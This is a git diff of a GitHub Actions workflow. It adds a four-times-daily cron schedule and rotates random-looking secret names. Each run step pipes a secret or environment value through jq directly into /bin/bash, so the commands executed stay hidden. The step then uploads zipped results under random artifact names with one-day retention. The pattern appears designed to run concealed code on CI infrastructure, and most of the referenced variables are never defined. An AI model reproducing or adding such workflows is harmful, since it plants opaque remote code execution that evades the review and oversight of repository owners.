@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '27 1,7,13,19 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,19 +16,18 @@ jobs:
         uses: actions/checkout@v4
       - name: Run
         env:
-          qe2804: ${{ secrets.qe2804 }}
+          jy56: ${{ secrets.jy56 }}
         run: |
-          printf '%s' "$qe2804" | jq -r .kmcip9 | /bin/bash
-          printf '%s' "$jk3000" | jq -r .kwti98 | /bin/bash
-          echo $umw9053 | jq -r .eqdei79536 | /bin/bash
-          echo $wgcju790 | jq -r .uahz7354 | /bin/bash
-          printf '%s' "$y2815" | jq -r .qxac986 | /bin/bash
-          printf '%s' "$zg43750" | jq -r .au6551 | /bin/bash
-          printf '%s' "$y66" | jq -r .x45 | /bin/bash
+          printf '%s' "$jy56" | jq -r .ihuy61 | /bin/bash
+          printf '%s' "$d65136" | jq -r .lttc77 | /bin/bash
+          echo $vfc5 | jq -r .gt7972 | /bin/bash
+          echo $l7531 | jq -r .xymh69 | /bin/bash
+          echo $znma9452 | jq -r .hbfyp5 | /bin/bash
+          printf '%s' "$x21663" | jq -r .p8 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: WjZonlcK
+          name: sZUzQzoO
           path: "*.zip"
           retention-days: 1
